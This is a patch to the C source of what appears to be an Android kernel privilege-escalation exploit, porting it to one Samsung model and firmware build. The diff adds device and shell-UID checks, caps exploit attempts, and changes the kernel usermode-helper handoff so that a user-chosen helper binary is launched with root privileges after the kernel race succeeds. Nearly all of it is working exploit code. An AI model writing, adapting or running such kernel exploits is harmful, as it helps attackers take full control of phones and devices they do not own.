@@ -1,0 +1,138 @@
+diff --git a/src/preload.c b/src/preload.c
+index d110fbe..070694f 100644
+--- a/src/preload.c
++++ b/src/preload.c
+@@ -1,4 +1,6 @@
+ #include "common.h"
++#include <sys/utsname.h>
++#include <sys/system_properties.h>
+ 
+ #define DEFAULT_EXPLOIT_ATTEMPTS 16
+ #define DEFAULT_PSELECT_DELAY_USEC 20000
+@@ -35,8 +37,42 @@ __attribute__((constructor)) static void load(void) {
+   started = 1;
+   set_unbuffer();
+ 
++  /* This experimental port deliberately supports only the verified stock
++   * kernel and shell transport. Refuse before entering the kernel race. */
++  struct utsname running;
++  char model[PROP_VALUE_MAX] = {0};
++  __system_property_get("ro.product.model", model);
++  if (uname(&running) != 0 || strcmp(model, "SM-S908W") != 0 ||
++      strcmp(running.release,
++             "5.10.236-android12-9-31998796-abS908WVLSAGZE3") != 0) {
++    pr_error("rmgnext: this payload requires SM-S908W S908WVLSAGZE3 exactly\n");
++    _exit(64);
++  }
++  if (getuid() != 2000 || geteuid() != 2000) {
++    pr_error("rmgnext: shell UID 2000 required; enable and authorize Shizuku\n");
++    _exit(65);
++  }
++  const char *helper = getenv("CVE43499_ROOT_HELPER");
++  if (!helper || helper[0] != '/' || strlen(helper) >= 256 ||
++      access(helper, X_OK) != 0) {
++    pr_error("rmgnext: Next bootstrap helper missing or not executable\n");
++    _exit(66);
++  }
++  const char *route = getenv("SLIDE_SOURCE");
++  if (route && strcmp(route, "tracefs") != 0 &&
++      strcmp(route, "auto") != 0 && strcmp(route, "default") != 0) {
++    pr_error("rmgnext: this port supports tracefs only; select tracefs route\n");
++    _exit(67);
++  }
++  unsetenv("SLIDE_P0_OFFSET");
++  pr_info("rmgnext: experimental S908WVLSAGZE3 shell port v1; helper=%s\n", helper);
++
+   int max_attempts = env_int(
+       "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
++  if (max_attempts > 1) {
++    pr_info("rmgnext: first-test build caps this run at one native attempt; reboot before another test\n");
++    max_attempts = 1;
++  }
+   int base_delay = env_int(
+       "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
+   if (getenv("SLIDE_ONLY")) {
+diff --git a/src/root.c b/src/root.c
+index b31d0ce..43c96f4 100644
+--- a/src/root.c
++++ b/src/root.c
+@@ -33,15 +33,18 @@ struct umh_completion {
+ 
+ struct umh_kernel_data {
+   struct umh_completion completion;
+-  char path[48];
++  char path[256];
+   char arg[8];
+-  uint64_t argv[3];
++  char uid[16];
++  uint64_t argv[4];
+   uint64_t envp[1];
+ };
+ 
+ _Static_assert(sizeof(struct umh_subprocess_info) == 112,
+                "subprocess_info layout");
+ _Static_assert(sizeof(struct umh_completion) == 32, "completion layout");
++_Static_assert(ROOT_UMH_DATA_OFF + sizeof(struct umh_kernel_data) <= 0x8000,
++               "root handoff must fit retained order-3 allocation");
+ 
+ static int root_read_data(
+     int fd, uintptr_t target, void *data, size_t len) {
+@@ -115,8 +118,17 @@ static int install_workqueue_umh_root(int fd) {
+   uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
+   struct umh_kernel_data umh_data;
+   memset(&umh_data, 0, sizeof(umh_data));
+-  snprintf(umh_data.path, sizeof(umh_data.path), "%s", ROOT_UMH_PATH);
++  /* Next supplies its own authenticated bootstrap helper. Do not start the
++   * standalone IonStack daemon: it uses a different socket protocol. */
++  const char *root_helper_path = getenv("CVE43499_ROOT_HELPER");
++  if (!root_helper_path || root_helper_path[0] != '/' ||
++      snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_helper_path) >=
++          (int)sizeof(umh_data.path)) {
++    pr_error("rmgnext: missing or invalid CVE43499_ROOT_HELPER\n");
++    return 0;
++  }
+   snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
++  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", (unsigned)getuid());
+   uintptr_t completion_addr =
+       umh_data_addr + offsetof(struct umh_kernel_data, completion);
+   uintptr_t wait_list_addr =
+@@ -125,6 +137,8 @@ static int install_workqueue_umh_root(int fd) {
+       umh_data_addr + offsetof(struct umh_kernel_data, path);
+   uintptr_t arg_addr =
+       umh_data_addr + offsetof(struct umh_kernel_data, arg);
++  uintptr_t uid_addr =
++      umh_data_addr + offsetof(struct umh_kernel_data, uid);
+   uintptr_t argv_addr =
+       umh_data_addr + offsetof(struct umh_kernel_data, argv);
+   uintptr_t envp_addr =
+@@ -133,7 +147,8 @@ static int install_workqueue_umh_root(int fd) {
+   umh_data.completion.prev = wait_list_addr;
+   umh_data.argv[0] = path_addr;
+   umh_data.argv[1] = arg_addr;
+-  umh_data.argv[2] = 0;
++  umh_data.argv[2] = uid_addr;
++  umh_data.argv[3] = 0;
+   umh_data.envp[0] = 0;
+   uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK_JT);
+ 
+@@ -147,13 +162,17 @@ static int install_workqueue_umh_root(int fd) {
+    * silently changed nothing. */
+   {
+     struct stat st;
+-    if (stat(ROOT_UMH_PATH, &st) != 0) {
++    if (stat(root_helper_path, &st) != 0) {
+       pr_warning("root umh helper stat failed errno=%d (%s)\n", errno,
+-                 ROOT_UMH_PATH);
++                 root_helper_path);
++      return 0;
+     } else {
+       pr_info("root umh helper mode=%o uid=%u gid=%u x_ok=%d\n",
+               st.st_mode & 07777, st.st_uid, st.st_gid,
+-              access(ROOT_UMH_PATH, X_OK) == 0);
++              access(root_helper_path, X_OK) == 0);
++      if (access(root_helper_path, X_OK) != 0) {
++        return 0;
++      }
+     }
+   }
+ 
